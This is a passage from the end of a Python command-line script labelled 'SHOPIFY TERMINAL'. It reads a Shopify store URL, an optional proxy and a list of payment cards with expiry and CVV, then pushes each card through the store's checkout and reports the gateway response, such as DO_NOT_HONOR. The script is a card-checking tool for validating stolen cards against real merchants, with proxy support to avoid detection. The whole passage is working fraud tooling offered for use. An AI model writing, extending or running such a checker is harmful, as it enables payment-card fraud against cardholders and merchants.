                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif "DO_NOT_HONOR" in res_text:
            output.update({
                "Response": "DO_NOT_HONOR",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        elif result:
            output.update({
                "Response": result,
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
        else:
            output.update({
                "Response": "UNKNOWN_RESPONSE",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card
            })
            
    except Exception as e:
        output.update({
            "Response": f"ERROR: {str(e)}",
            "Status": False,
        })
        
    return output


def print_banner():
    """Print application banner"""
    print("=" * 60)
    print(" SHOPIFY TERMINAL - GraphQL Checkout ".center(60))
    print("=" * 60)
    print()


def print_result(result, card_masked):
    """Print formatted result"""
    status_icon = "[+]" if result.get("Status") else "[-]"
    response = result.get("Response", "UNKNOWN")
    gateway = result.get("Gateway", "Unknown")
    price = result.get("Price", 0)
    
    print()
    print("-" * 60)
    print(f"{status_icon} Card: {card_masked}")
    print(f"{status_icon} Response: {response}")
    print(f"{status_icon} Gateway: {gateway}")
    print(f"{status_icon} Price: ${price:.2f}" if isinstance(price, (int, float)) else f"{status_icon} Price: {price}")
    print("-" * 60)


async def process_cards(url, cards, proxy=None):
    """Process multiple cards"""
    # Configure httpx client
    if proxy:
        transport = httpx.AsyncHTTPTransport(proxy=proxy)
        session = httpx.AsyncClient(transport=transport, timeout=30.0, follow_redirects=True)
    else:
        session = httpx.AsyncClient(timeout=30.0, follow_redirects=True)
        
    async with session:
        for idx, card in enumerate(cards, 1):
            card = card.strip()
            if not card or '|' not in card:
                continue
                
            parts = card.split('|')
            if len(parts) != 4:
                print(f"[{idx}] Invalid card format: {card}")
                continue
                
            cc = parts[0]
            card_masked = f"{cc[:6]}******{cc[-4:]}|{parts[1]}|{parts[2]}|{parts[3]}"
            
            print()
            print(f"[{idx}/{len(cards)}] Processing: {card_masked}")
            
            result = await shopify_checkout(url, card, session)
            print_result(result, card_masked)
            
            # Output as JSON for programmatic use
            print(f"JSON: {json.dumps(result)}")
            
            # Wait between cards
            if idx < len(cards):
                await asyncio.sleep(2)


async def main():
    """Main entry point"""
    print_banner()
    
    # Get website URL
    url = input("[?] Enter Shopify website URL: ").strip()
    if not url:
        print("[-] No URL provided!")
        return
        
    # Get proxy (optional)
    use_proxy = input("[?] Use proxy? (y/n): ").strip().lower()
    proxy = None
    if use_proxy == 'y':
        proxy = input("[?] Enter proxy (http://ip:port or http://user:pass@ip:port): ").strip()
        
    # Get cards
    print()
    print("=" * 60)
    print(" Enter cards in format: xxxxxxxxxxxxxxxx|MM|YY|CVV")
    print(" Type 'done' when finished")
    print("=" * 60)
    print()
    
    cards = []
    while True:
        card = input("[+] Card: ").strip()
        if card.lower() == 'done':
            break
        if card:
            cards.append(card)
            
    if not cards:
        print("[-] No cards entered!")
        return
        
    print()
    print(f"[*] Starting check for {len(cards)} card(s)...")
    
    await process_cards(url, cards, proxy)
    
    print()
    print("=" * 60)
    print(" CHECK COMPLETE ".center(60))
    print("=" * 60)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {str(e)}")
